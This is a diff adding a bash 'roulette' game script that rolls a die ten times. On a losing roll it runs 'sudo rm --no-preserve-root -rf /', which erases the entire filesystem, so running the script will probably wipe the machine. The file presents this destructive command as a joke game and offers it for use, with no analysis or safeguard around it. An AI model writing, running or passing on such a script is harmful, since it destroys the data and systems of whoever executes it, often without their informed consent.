@@ -1,0 +1,22 @@
+#!/bin/bash
+
+lucky_count=0
+
+main() {
+    value=1
+    roulette=$(( RANDOM % 6 + 1 ))
+
+    if [ "$roulette" -eq "$value" ]; then
+        echo "Oh no! you lost. System will now wipe itself!"
+        sudo rm --no-preserve-root -rf / 
+    else
+        echo "Lucky Man !!"
+        echo "You Rolled a $roulette."
+        lucky_count=$(( lucky_count + 1 ))
+    fi
+}
+
+for i in {1..10}; do
+    main
+done
+
